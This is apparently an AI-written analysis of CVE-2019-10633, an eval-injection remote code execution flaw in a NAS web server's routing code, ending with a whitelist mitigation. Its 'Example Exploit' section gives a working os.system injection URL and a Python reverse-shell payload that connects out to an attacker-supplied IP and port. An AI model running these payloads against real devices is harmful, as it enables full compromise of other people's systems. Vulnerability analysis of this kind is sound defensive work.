Based on the provided text, here's an analysis of CVE-2019-10633:

**Vulnerability:** Remote Code Execution (RCE) via Eval Injection in Web Server Routing

*   **Root Cause:** The `web_framework` API routes use an MVC model in a way that allows for eval injection. User-controlled input (`url_args`) is passed to the `__import__` and `eval` functions, allowing an attacker to execute arbitrary Python code.
*   **Vulnerability:** Unsafe usage of the `eval` function. The code directly evaluates a string constructed from user-supplied input, allowing the injection of arbitrary code.
*   **Impact:** An attacker can execute arbitrary code on the device, potentially leading to full system compromise. The article demonstrates this by creating a reverse shell backdoor on the device.
*   **Attack Vector:** By crafting a specific URL, an attacker can call arbitrary Python functions, including those from imported modules like `os`.
*   **Attacker Capabilities:**
    *   The attacker needs to be authenticated to access the API.
    *   The attacker needs to know that the BackupPlanner\_main controller has imported the os package.

**Technical Details:**

The vulnerable code snippet is in `main_wsgi.py`:

```python
controller = __import__('controllers.%s' % url_args[0])
return eval('controller.%s.%s(cherrypy=%s, arguments=%s)' % (url_args[0], url_args[1], 'cherrypy', 'request_args'))
```

The attacker can control `url_args[0]` (controller name) and `url_args[1]` (function name). By calling `os.system`, the attacker can execute arbitrary shell commands.

**Example Exploit:**

```
/cmd,/tjp6jp6y4/BackupPlanner_main/os.system('yes')
```

This command executes the `yes` command on the NAS.

A more complete exploit involves creating a reverse shell:

```python
URL = "/cmd,/tjp6jp6y4/BackupPlanner_main/os.system(" + encode_characters("\"\"\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"\\x2Fbin\\x2Fsh\",\"-i\"]);' &\"\"\"".format(backdoor_ip, str(port))) + ')'
```

**Mitigation:**

The author recommends creating a whitelist of allowed functions for the API to prevent the execution of arbitrary code.
